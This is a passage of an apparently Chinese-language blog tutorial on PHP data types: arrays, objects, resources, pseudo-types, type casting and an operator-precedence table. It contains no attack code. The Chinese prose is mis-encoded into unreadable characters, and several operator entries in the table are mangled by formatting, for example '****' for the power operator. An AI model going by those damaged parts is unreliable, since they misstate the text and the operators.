class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥åªå¯¹æŸäº›å•å…ƒæŒ‡å®šé”®åè€Œå¯¹å…¶å®ƒçš„ç©ºç½®ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">         <span class="string">"a"</span>,</span><br><span class="line">         <span class="string">"b"</span>,</span><br><span class="line">    <span class="number">6</span> =&gt; <span class="string">"c"</span>,</span><br><span class="line">         <span class="string">"d"</span>,</span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">array(4) &#123;</span></span><br><span class="line"><span class="comment">  [0]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "a"</span></span><br><span class="line"><span class="comment">  [1]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "b"</span></span><br><span class="line"><span class="comment">  [6]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "c"</span></span><br><span class="line"><span class="comment">  [7]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) "d"</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="è®¿é—®æ•°ç»„å•å…ƒ"><a href="#è®¿é—®æ•°ç»„å•å…ƒ" class="headerlink" title="è®¿é—®æ•°ç»„å•å…ƒ"></a>è®¿é—®æ•°ç»„å•å…ƒ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,</span><br><span class="line">    <span class="number">42</span>    =&gt; <span class="number">24</span>,</span><br><span class="line">    <span class="string">"multi"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">         <span class="string">"dimensional"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">             <span class="string">"array"</span> =&gt; <span class="string">"foo"</span></span><br><span class="line">         )</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">var_dump($array[<span class="string">"foo"</span>]);</span><br><span class="line">var_dump($array[<span class="number">42</span>]);</span><br><span class="line">var_dump($array[<span class="string">"multi"</span>][<span class="string">"dimensional"</span>][<span class="string">"array"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Note</strong>:</p>
<p>æ–¹æ‹¬å·å’ŒèŠ±æ‹¬å·å¯ä»¥äº’æ¢ä½¿ç”¨æ¥è®¿é—®æ•°ç»„å•å…ƒï¼ˆä¾‹å¦‚ $array[42] å’Œ $array{42} åœ¨ä¸Šä¾‹ä¸­æ•ˆæœç›¸åŒï¼‰ã€‚</p>
</blockquote>
<h4 id="æ–°å»ºã€ä¿®æ”¹ã€åˆ é™¤å€¼"><a href="#æ–°å»ºã€ä¿®æ”¹ã€åˆ é™¤å€¼" class="headerlink" title="æ–°å»ºã€ä¿®æ”¹ã€åˆ é™¤å€¼"></a>æ–°å»ºã€ä¿®æ”¹ã€åˆ é™¤å€¼</h4><p>è¦ä¿®æ”¹æŸä¸ªå€¼ï¼Œé€šè¿‡å…¶é”®åç»™è¯¥å•å…ƒèµ‹ä¸€ä¸ªæ–°å€¼ã€‚è¦åˆ é™¤æŸé”®å€¼å¯¹ï¼Œå¯¹å…¶è°ƒç”¨ <a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">5</span> =&gt; <span class="number">1</span>, <span class="number">12</span> =&gt; <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$arr[] = <span class="number">56</span>;    <span class="comment">// This is the same as $arr[13] = 56;</span></span><br><span class="line">                <span class="comment">// at this point of the script</span></span><br><span class="line"></span><br><span class="line">$arr[<span class="string">"x"</span>] = <span class="number">42</span>; <span class="comment">// This adds a new element to</span></span><br><span class="line">                <span class="comment">// the array with key "x"</span></span><br><span class="line">                </span><br><span class="line"><span class="keyword">unset</span>($arr[<span class="number">5</span>]); <span class="comment">// This removes the element from the array</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>($arr);    <span class="comment">// This deletes the whole array</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ•°ç»„è§£å¼•ç”¨"><a href="#æ•°ç»„è§£å¼•ç”¨" class="headerlink" title="æ•°ç»„è§£å¼•ç”¨"></a>æ•°ç»„è§£å¼•ç”¨</h4><p>è‡ª PHP 5.4 èµ·å¯ä»¥ç”¨ç›´æ¥å¯¹å‡½æ•°æˆ–æ–¹æ³•è°ƒç”¨çš„ç»“æœè¿›è¡Œæ•°ç»„è§£å¼•ç”¨ï¼Œåœ¨æ­¤ä¹‹å‰åªèƒ½é€šè¿‡ä¸€ä¸ªä¸´æ—¶å˜é‡ã€‚</p>
<p>è‡ª PHP 5.5 èµ·å¯ä»¥ç›´æ¥å¯¹ä¸€ä¸ªæ•°ç»„åŸå‹è¿›è¡Œæ•°ç»„è§£å¼•ç”¨ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArray</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// on PHP 5.4</span></span><br><span class="line">$secondElement = getArray()[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// previously</span></span><br><span class="line">$tmp = getArray();</span><br><span class="line">$secondElement = $tmp[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// or</span></span><br><span class="line"><span class="keyword">list</span>(, $secondElement) = getArray();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ•°ç»„å®ç”¨å‡½æ•°"><a href="#æ•°ç»„å®ç”¨å‡½æ•°" class="headerlink" title="æ•°ç»„å®ç”¨å‡½æ•°"></a>æ•°ç»„å®ç”¨å‡½æ•°</h4><p><a href="https://www.php.net/manual/zh/function.unset.php" target="_blank" rel="noopener">unset()</a> å‡½æ•°å…è®¸åˆ é™¤æ•°ç»„ä¸­çš„æŸä¸ªé”®ã€‚ä½†è¦æ³¨æ„æ•°ç»„å°†<em>ä¸ä¼š</em>é‡å»ºç´¢å¼•ã€‚å¦‚æœéœ€è¦åˆ é™¤åé‡å»ºç´¢å¼•ï¼Œå¯ä»¥ç”¨ <a href="https://www.php.net/manual/zh/function.array-values.php" target="_blank" rel="noopener">array_values()</a> å‡½æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="string">'one'</span>, <span class="number">2</span> =&gt; <span class="string">'two'</span>, <span class="number">3</span> =&gt; <span class="string">'three'</span>);</span><br><span class="line"><span class="keyword">unset</span>($a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">/* will produce an array that would have been defined as</span></span><br><span class="line"><span class="comment">   $a = array(1 =&gt; 'one', 3 =&gt; 'three');</span></span><br><span class="line"><span class="comment">   and NOT</span></span><br><span class="line"><span class="comment">   $a = array(1 =&gt; 'one', 2 =&gt;'three');</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$b = array_values($a);</span><br><span class="line"><span class="comment">// Now $b is array(0 =&gt; 'one', 1 =&gt;'three')</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤å¤–ï¼Œforeachå‡½æ•°ä¸“é—¨ç”¨äºæ•°ç»„ã€‚ï¼ˆç®€å•éå†ï¼‰</p>
<h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><p>åº”è¯¥å§‹ç»ˆåœ¨ç”¨å­—ç¬¦ä¸²è¡¨ç¤ºçš„æ•°ç»„ç´¢å¼•ä¸ŠåŠ ä¸Šå¼•å·ã€‚è€Œé”®åä¸ºå¸¸é‡å’Œå˜é‡çš„ä¸éœ€è¦åŠ å¼•å·ã€‚</p>
<p>å¯ç”¨å‡½æ•°è¿”å›å€¼åšæ•°ç»„ç´¢å¼•ã€‚ä¹Ÿå¯ç”¨å·²çŸ¥å¸¸é‡ã€‚</p>
<h4 id="è½¬æ¢ä¸ºæ•°ç»„"><a href="#è½¬æ¢ä¸ºæ•°ç»„" class="headerlink" title="è½¬æ¢ä¸ºæ•°ç»„"></a>è½¬æ¢ä¸ºæ•°ç»„</h4><p>å¯¹äºä»»æ„ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a>ï¼Œ<a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>ï¼Œ<a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a>ï¼Œ<a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a> å’Œ <a href="https://www.php.net/manual/zh/language.types.resource.php" target="_blank" rel="noopener">resource</a> ç±»å‹ï¼Œå¦‚æœå°†ä¸€ä¸ªå€¼è½¬æ¢ä¸ºæ•°ç»„ï¼Œå°†å¾—åˆ°ä¸€ä¸ªä»…æœ‰ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œå…¶ä¸‹æ ‡ä¸º 0ï¼Œè¯¥å…ƒç´ å³ä¸ºæ­¤æ ‡é‡çš„å€¼ã€‚æ¢å¥è¯è¯´ï¼Œ*(array)$scalarValue* ä¸ <em>array($scalarValue)</em> å®Œå…¨ä¸€æ ·ã€‚</p>
<p>å¦‚æœä¸€ä¸ª <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> ç±»å‹è½¬æ¢ä¸º <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a>ï¼Œåˆ™ç»“æœä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå…¶å•å…ƒä¸ºè¯¥å¯¹è±¡çš„å±æ€§ã€‚é”®åå°†ä¸ºæˆå‘˜å˜é‡åï¼Œä¸è¿‡æœ‰å‡ ç‚¹ä¾‹å¤–ï¼šæ•´æ•°å±æ€§ä¸å¯è®¿é—®ï¼›ç§æœ‰å˜é‡å‰ä¼šåŠ ä¸Šç±»åä½œå‰ç¼€ï¼›ä¿æŠ¤å˜é‡å‰ä¼šåŠ ä¸Šä¸€ä¸ª â€˜*â€™ åšå‰ç¼€ã€‚è¿™äº›å‰ç¼€çš„å‰åéƒ½å„æœ‰ä¸€ä¸ª NULL å­—ç¬¦ã€‚è¿™ä¼šå¯¼è‡´ä¸€äº›ä¸å¯é¢„çŸ¥çš„è¡Œä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $A; <span class="comment">// This will become '\0A\0A'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $A; <span class="comment">// This will become '\0B\0A'</span></span><br><span class="line">    <span class="keyword">public</span> $AA; <span class="comment">// This will become 'AA'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump((<span class="keyword">array</span>) <span class="keyword">new</span> B());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="æ¯”è¾ƒ"><a href="#æ¯”è¾ƒ" class="headerlink" title="æ¯”è¾ƒ"></a>æ¯”è¾ƒ</h4><p>array_diff()ï¼Œæ•°ç»„è¿ç®—ç¬¦ã€‚</p>
<h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><h4 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h4><p>new è¯­å¥ã€‚</p>
<h4 id="è½¬æ¢ä¸ºå¯¹è±¡"><a href="#è½¬æ¢ä¸ºå¯¹è±¡" class="headerlink" title="è½¬æ¢ä¸ºå¯¹è±¡"></a>è½¬æ¢ä¸ºå¯¹è±¡</h4><p>å¦‚æœå…¶å®ƒä»»ä½•ç±»å‹çš„å€¼è¢«è½¬æ¢æˆå¯¹è±¡ï¼Œå°†ä¼šåˆ›å»ºä¸€ä¸ªå†…ç½®ç±» <em>stdClass</em> çš„å®ä¾‹ã€‚å¦‚æœè¯¥å€¼ä¸º **<code>NULL</code>**ï¼Œåˆ™æ–°çš„å®ä¾‹ä¸ºç©ºã€‚ <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> è½¬æ¢æˆ <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a> å°†ä½¿é”®åæˆä¸ºå±æ€§åå¹¶å…·æœ‰ç›¸å¯¹åº”çš„å€¼ã€‚æ³¨æ„ï¼šåœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œ ä½¿ç”¨ PHP 7.2.0 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œæ•°å­—é”®åªèƒ½é€šè¿‡è¿­ä»£è®¿é—®ã€‚å¯¹äºå…¶ä»–å€¼ï¼Œä¼šåŒ…å«è¿›æˆå‘˜å˜é‡å <em>scalar</em>ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$obj = (object) <span class="string">'ciao'</span>;</span><br><span class="line"><span class="keyword">echo</span> $obj-&gt;scalar;  <span class="comment">// outputs 'ciao'</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Resource"><a href="#Resource" class="headerlink" title="Resource"></a>Resource</h3><p><code>get_resource_type</code> è¿”å›èµ„æºç±»å‹ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$c = mysql_connect();</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($c).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// æ‰“å°ï¼šmysql link</span></span><br><span class="line"></span><br><span class="line">$fp = fopen(<span class="string">"foo"</span>,<span class="string">"w"</span>);</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($fp).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// æ‰“å°ï¼šfile</span></span><br><span class="line"></span><br><span class="line">$doc = new_xmldoc(<span class="string">"1.0"</span>);</span><br><span class="line"><span class="keyword">echo</span> get_resource_type($doc-&gt;doc).<span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// æ‰“å°ï¼šdomxml document</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Callback-Callable"><a href="#Callback-Callable" class="headerlink" title="Callback/Callable"></a>Callback/Callable</h3><p>è‡ª PHP 5.4 èµ·å¯ç”¨ <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> ç±»å‹æŒ‡å®šå›è°ƒç±»å‹ callbackã€‚</p>
<h3 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h3><p>NULL å€¼è¡¨ç¤ºå˜é‡æ²¡æœ‰å€¼ã€‚NULL æ˜¯æ•°æ®ç±»å‹ä¸º NULL çš„å€¼ã€‚</p>
<h3 id="ä¼ªç±»å‹ä¸å˜é‡"><a href="#ä¼ªç±»å‹ä¸å˜é‡" class="headerlink" title="ä¼ªç±»å‹ä¸å˜é‡"></a>ä¼ªç±»å‹ä¸å˜é‡</h3><h4 id="mixed"><a href="#mixed" class="headerlink" title="mixed"></a>mixed</h4><p>ä¸€ä¸ªå‚æ•°å¯ä»¥æ¥å—å¤šç§ä¸åŒçš„ï¼ˆä½†ä¸ä¸€å®šæ˜¯æ‰€æœ‰çš„ï¼‰ç±»å‹ã€‚</p>
<h4 id="number"><a href="#number" class="headerlink" title="number"></a>number</h4><p>å¯ä»¥æ˜¯ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a> æˆ–è€… <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a>ã€‚</p>
<h4 id="callback"><a href="#callback" class="headerlink" title="callback"></a>callback</h4><p>åœ¨ PHP 5.4 å¼•å…¥ <a href="https://www.php.net/manual/zh/language.types.callable.php" target="_blank" rel="noopener">callable</a> ç±»å‹ä¹‹å‰ä½¿ç”¨ äº† <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.callback" target="_blank" rel="noopener">callback</a> ä¼ªç±»å‹ã€‚äºŒè€…å«ä¹‰å®Œå…¨ç›¸åŒã€‚</p>
<h4 id="array-object"><a href="#array-object" class="headerlink" title="array|object"></a>array|object</h4><p>æ—¢å¯ä»¥æ˜¯ <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a> ä¹Ÿå¯ä»¥æ˜¯ <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a>ã€‚</p>
<h4 id="void"><a href="#void" class="headerlink" title="void"></a>void</h4><p><em>void</em> ä½œä¸ºè¿”å›ç±»å‹æ„å‘³ç€å‡½æ•°çš„è¿”å›å€¼æ˜¯æ— ç”¨çš„ã€‚<em>void</em> ä½œä¸ºå‚æ•°åˆ—è¡¨æ„å‘³ç€å‡½æ•°ä¸æ¥å—ä»»ä½•å‚æ•°ã€‚</p>
<h4 id="â€¦"><a href="#â€¦" class="headerlink" title="â€¦"></a>â€¦</h4><p>åœ¨å‡½æ•°åŸå‹ä¸­ï¼Œ<code>$...</code> è¡¨ç¤º<em>ç­‰ç­‰</em>çš„æ„æ€ã€‚å½“ä¸€ä¸ªå‡½æ•°å¯ä»¥æ¥å—ä»»æ„ä¸ªå‚æ•°æ—¶ä½¿ç”¨æ­¤å˜é‡åã€‚</p>
<h3 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h3><h4 id="ç±»å‹è®¾ç½®"><a href="#ç±»å‹è®¾ç½®" class="headerlink" title="ç±»å‹è®¾ç½®"></a>ç±»å‹è®¾ç½®</h4><p>settypeè®¾ç½®å˜é‡ç±»å‹ã€‚</p>
<p>settype ( <a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed" target="_blank" rel="noopener">mixed</a> <code>&amp;$var</code> , string <code>$type</code> ) : bool</p>
<p>varæ˜¯å¾…è½¬æ¢å˜é‡ã€‚typeæ˜¯è¦è½¬æ¢çš„ç±»å‹ã€‚è¿”å›å€¼æ˜¯æˆåŠŸä¸å¦ã€‚</p>
<p>å®ä¾‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$foo = <span class="string">"5bar"</span>; <span class="comment">// string</span></span><br><span class="line">$bar = <span class="keyword">true</span>;   <span class="comment">// boolean</span></span><br><span class="line"></span><br><span class="line">settype($foo, <span class="string">"integer"</span>); <span class="comment">// $foo ç°åœ¨æ˜¯ 5   (integer)</span></span><br><span class="line">settype($bar, <span class="string">"string"</span>);  <span class="comment">// $bar ç°åœ¨æ˜¯ "1" (string)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ç±»å‹å¼ºåˆ¶è½¬æ¢"><a href="#ç±»å‹å¼ºåˆ¶è½¬æ¢" class="headerlink" title="ç±»å‹å¼ºåˆ¶è½¬æ¢"></a>ç±»å‹å¼ºåˆ¶è½¬æ¢</h4><p>åœ¨è¦è½¬æ¢çš„å˜é‡ä¹‹å‰åŠ ä¸Šç”¨æ‹¬å·æ‹¬èµ·æ¥çš„ç›®æ ‡ç±»å‹ã€‚</p>
<p>å…è®¸çš„å¼ºåˆ¶è½¬æ¢æœ‰ï¼š</p>
<ul>
<li>(int), (integer) - è½¬æ¢ä¸ºæ•´å½¢ <a href="https://www.php.net/manual/zh/language.types.integer.php" target="_blank" rel="noopener">integer</a></li>
<li>(bool), (boolean) - è½¬æ¢ä¸ºå¸ƒå°”ç±»å‹ <a href="https://www.php.net/manual/zh/language.types.boolean.php" target="_blank" rel="noopener">boolean</a></li>
<li>(float), (double), (real) - è½¬æ¢ä¸ºæµ®ç‚¹å‹ <a href="https://www.php.net/manual/zh/language.types.float.php" target="_blank" rel="noopener">float</a></li>
<li>(string) - è½¬æ¢ä¸ºå­—ç¬¦ä¸² <a href="https://www.php.net/manual/zh/language.types.string.php" target="_blank" rel="noopener">string</a></li>
<li>(array) - è½¬æ¢ä¸ºæ•°ç»„ <a href="https://www.php.net/manual/zh/language.types.array.php" target="_blank" rel="noopener">array</a></li>
<li>(object) - è½¬æ¢ä¸ºå¯¹è±¡ <a href="https://www.php.net/manual/zh/language.types.object.php" target="_blank" rel="noopener">object</a></li>
<li>(unset) - è½¬æ¢ä¸º <a href="https://www.php.net/manual/zh/language.types.null.php" target="_blank" rel="noopener">NULL</a> (PHP 5)</li>
<li>(binary) è½¬æ¢å’Œ b å‰ç¼€è½¬æ¢æ”¯æŒä¸º PHP 5.2.1 æ–°å¢ã€‚è½¬æ¢ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²ã€‚</li>
</ul>
<blockquote>
<p><strong>Note:</strong> å¯ä»¥å°†å˜é‡æ”¾ç½®åœ¨åŒå¼•å·ä¸­çš„æ–¹å¼æ¥ä»£æ›¿å°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<h2 id="è¿ç®—ç¬¦"><a href="#è¿ç®—ç¬¦" class="headerlink" title="è¿ç®—ç¬¦"></a>è¿ç®—ç¬¦</h2><h3 id="è¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#è¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="è¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>è¿ç®—ç¬¦ä¼˜å…ˆçº§</h3><table>
<thead>
<tr>
<th align="left">ç»“åˆæ–¹å‘</th>
<th align="left">è¿ç®—ç¬¦</th>
<th align="left">é™„åŠ ä¿¡æ¯</th>
</tr>
</thead>
<tbody><tr>
<td align="left">æ— </td>
<td align="left">clone new</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.oop5.cloning.php" target="_blank" rel="noopener">clone</a> å’Œ <a href="https://www.php.net/manual/zh/language.oop5.basic.php#language.oop5.basic.new" target="_blank" rel="noopener">new</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left">****</td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">ç®—æœ¯è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>++</em> <em>â€“</em> <em>~</em> <em>(int)</em> <em>(float)</em> <em>(string)</em> <em>(array)</em> <em>(object)</em> <em>(bool)</em> <em>@</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">ç±»å‹</a>ã€<a href="https://www.php.net/manual/zh/language.operators.increment.php" target="_blank" rel="noopener">é€’å¢ï¼é€’å‡</a>ã€<a href="https://www.php.net/manual/zh/language.operators.errorcontrol.php" target="_blank" rel="noopener">é”™è¯¯æ§åˆ¶</a></td>
</tr>
<tr>
<td align="left">æ— </td>
<td align="left"><em>instanceof</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.types.php" target="_blank" rel="noopener">ç±»å‹</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>!</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left">*** <em>/</em> <em>%</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">ç®—æœ¯è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>+</em> <em>-</em> <em>.</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.arithmetic.php" target="_blank" rel="noopener">ç®—æœ¯è¿ç®—ç¬¦</a> å’Œ <a href="https://www.php.net/manual/zh/language.operators.string.php" target="_blank" rel="noopener">å­—ç¬¦ä¸²è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>&lt;&lt;* *&gt;&gt;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">ä½è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">æ— </td>
<td align="left"><em>&lt;* *&lt;=* *&gt;</em> <em>&gt;=</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">æ¯”è¾ƒè¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">æ— </td>
<td align="left"><em>==</em> <em>!=</em> <em>===</em> <em>!==</em> <em>&lt;&gt;</em> <em>&lt;=&gt;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php" target="_blank" rel="noopener">æ¯”è¾ƒè¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>&amp;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">ä½è¿ç®—ç¬¦</a> å’Œ <a href="https://www.php.net/manual/zh/language.references.php" target="_blank" rel="noopener">å¼•ç”¨</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>^</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">ä½è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>|</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.bitwise.php" target="_blank" rel="noopener">ä½è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>&amp;&amp;</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>||</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>??</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.coalesce" target="_blank" rel="noopener">null åˆå¹¶è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>? :</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.comparison.php#language.operators.comparison.ternary" target="_blank" rel="noopener">ä¸‰å…ƒè¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>=</em> <em>+=</em> <em>-=</em> **=* ***=* <em>/=</em> <em>.=</em> <em>%=</em> <em>&amp;=</em> <em>|=</em> <em>^=</em> <em>&lt;&lt;=* *&gt;&gt;=</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.assignment.php" target="_blank" rel="noopener">èµ‹å€¼è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>yield from</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.generators.syntax.php#control-structures.yield.from" target="_blank" rel="noopener">yield from</a></td>
</tr>
<tr>
<td align="left">å³</td>
<td align="left"><em>yield</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.generators.syntax.php#control-structures.yield" target="_blank" rel="noopener">yield</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>and</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>xor</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
<tr>
<td align="left">å·¦</td>
<td align="left"><em>or</em></td>
<td align="left"><a href="https://www.php.net/manual/zh/language.operators.logical.php" target="_blank" rel="noopener">é€»è¾‘è¿ç®—ç¬¦</a></td>
</tr>
</tbody></table>
